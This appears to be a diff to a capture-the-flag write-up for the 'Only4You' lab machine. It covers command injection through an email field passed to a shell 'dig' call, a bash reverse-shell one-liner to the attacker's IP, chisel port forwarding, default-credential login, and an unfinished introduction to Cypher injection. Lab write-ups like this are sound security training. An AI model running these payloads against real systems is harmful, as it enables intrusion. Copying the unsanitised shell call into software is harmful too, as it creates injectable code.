@@ -312,11 +312,197 @@ def index():
             flash('You are not authorized!', 'danger')
 ```
 
-It imports sendmessage from form library.  
+It imports sendmessage from form module.  
 And also it passes user data to sendmessage function as seen below:  
 ```
 status = sendmessage(email, subject, message, ip)
 ```
+
+It means that there is likely a form.py file in the same directory.  
+We can try to read it with LFI:  
+
+```
+import re
+import smtplib
+from email.message import EmailMessage
+from subprocess import run, PIPE
+
+def sendmessage(email, subject, message, ip):
+    status = issecure(email, ip)
+    
+    if status == 2:
+        msg = EmailMessage()
+        msg['From'] = email
+        msg['To'] = 'info@only4you.htb'
+        msg['Subject'] = subject
+        msg.set_content(message)
+        
+        smtp = smtplib.SMTP(host='localhost', port=25)
+        smtp.send_message(msg)
+        smtp.quit()
+        return status
+
+    elif status == 1:
+        return status
+    else:
+        return status
+
+def issecure(email, ip):
+    if not re.match(r"([A-Za-z0-9]+[.\-_])*[A-Za-z0-9]+@[A-Za-z0-9\-]+(\.[A-Za-z]{2,})", email):
+        return 0
+    else:
+        domain = email.split("@", 1)[1]
+        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+        output = result.stdout.decode('utf-8')
+
+        if "v=spf1" not in output:
+            return 1
+        else:
+            <...SNIP...>
+```
+
+This file has two functions:  sendmessage(), and issecure()  
+issecure checks if email specified is a valid email using regex pattern.  
+it then uses subprocess.run to check the domain.  
+What's intresting is that it runs os command dig:    
+```
+result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+```
+
+
+## Exploiting command injection  
+
+It runs os command, without proper sanitization meaning we can inject commands there most likely.  
+Let's catch a request with burp sending contact form, and send it to repeater with ctrl+r.  
+
+![obraz](https://github.com/user-attachments/assets/5871fabf-d586-4b39-8693-23cea4d1408b)
+
+Now we can run tcpdump to watch for incoming pings in the background:  
+
+![obraz](https://github.com/user-attachments/assets/ed97cb61-c2b5-4604-bf02-1cd4a2fe59d3)
+
+Now we can inject commands into email parameter:  
+
+![obraz](https://github.com/user-attachments/assets/12738363-27fb-4416-bfcf-22b10388c193)
+
+Before sending it you need to select your whole command and press ctrl+u to URL encode it.  
+Now we should get pings from the target machine which means we have Remote Code Execution.  
+
+![obraz](https://github.com/user-attachments/assets/429964e8-6a43-4a22-8c20-a53441339c11)
+
+All we need to do now is to find proper payload that will give us connection back.  
+Payload I'll use is very simple but it works.  
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.10/9005 0>&1'
+```
+![obraz](https://github.com/user-attachments/assets/b9e6c864-750d-43aa-8b59-d8a7ce530522)
+
+In the screenshot it's already encoded.  
+
+We have successfully gained a shell access:  
+
+![obraz](https://github.com/user-attachments/assets/cd72d9c4-0a48-41ba-9668-c24ec15f1829)
+
+
+
+## Priv esc to john
+
+I tried to access two of the home folders but as www-data we can't do that.  
+There are some files in /opt that might be intresting but we can't access them either.  
+But without deep enumeration I end up finding intresting port open:  
+```
+netstat -nvlp
+```
+![obraz](https://github.com/user-attachments/assets/bfc3cc9a-dc9e-425f-bda2-edd62ab631a4)
+
+Port 8001 seems intresting.  We can ofc try to curl it first:  
+```
+curl http://127.0.0.1:8001
+```
+![obraz](https://github.com/user-attachments/assets/b0fac5e6-7bd7-4a60-9128-4243d111cd48)
+
+Unfortunately it only shows a redirect page, we need to forward this port to see it.  
+It can be achieved with a tool called "chisel".   
+We will use reverse server on kali linux to listen for connections.  
+And connect from the target machine using SOCKS5 proxy to forward all ports at once.  
+
+Chisel binary can be downloaded here:  
+```
+https://github.com/jpillora/chisel/releases
+```
+
+Now on kali we need to run reverse server on port 2222 or any other port:  
+```
+chisel server -p 2222 -reverse
+```
+
+![obraz](https://github.com/user-attachments/assets/2b5dacef-090a-4a95-8405-882332147351)
+
+
+Move chisel binary to the target machine with python server and wget:  
+And give it execute permission with chmod +x.  
+
+![obraz](https://github.com/user-attachments/assets/ad33066b-2474-4223-b3d3-39352810d130)
+
+Now we can run a connection to our kali IP:  
+```
+./chisel client 10.10.14.10:2222 R:1080:socks
+```
+![obraz](https://github.com/user-attachments/assets/fbd82610-9338-424c-a3a7-751bbad40430)
+
+Last thing we need to configure is FoxyProxy for proxychains.  
+Proxychains is a tool that is by default on kali so you shouldn't worry by that.  
+
+I'll add a new proxy in FoxyProxy settings and configure it like that:  
+
+![obraz](https://github.com/user-attachments/assets/131b9c7d-5028-4efd-8e72-f140f740d48a)
+
+Now use it as current proxy:  
+
+![obraz](https://github.com/user-attachments/assets/cd79915c-db4c-492d-b2d1-4e7a9a5c6167)
+
+Now we should be able to access port 8001 in our browser on kali by going to:   
+```
+http://localhost:8001
+```
+
+It gives us login page as show below:  
+
+![obraz](https://github.com/user-attachments/assets/85d64ec0-a8f8-438c-b213-165ebfe40a99)
+
+When we see a login page (especially when it runs on localhost only) we should always try some default credentials.  
+In this case admin:admin worked.  
+
+![obraz](https://github.com/user-attachments/assets/f1ad9c86-ff20-4337-be61-d00b11f7beb9)
+
+There is a hint saying:  
+"Migrated to a new database(neo4j)"   
+
+It can be validated by looking at previously shown ports, port 7474 is used for neo4j database.  
+First thing that came to my mind is that it could be a hint for neo4j Cypher injection.  
+
+
+## Neo4j - Cypher Injection
+
+Let’s start with a brief introduction.  
+Cypher is the query language used by Neo4j, a popular graph database.  
+It’s similar in purpose to SQL but is specifically designed for querying and manipulating graph data structures rather than traditional relational tables.  
+
+You’ve probably heard of SQL injection, a common attack where malicious users inject SQL code into queries to manipulate or access unauthorized data. Similarly, Cypher injection occurs when an attacker injects malicious Cypher code into a query, exploiting vulnerabilities in how the query is constructed or parameterized.  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
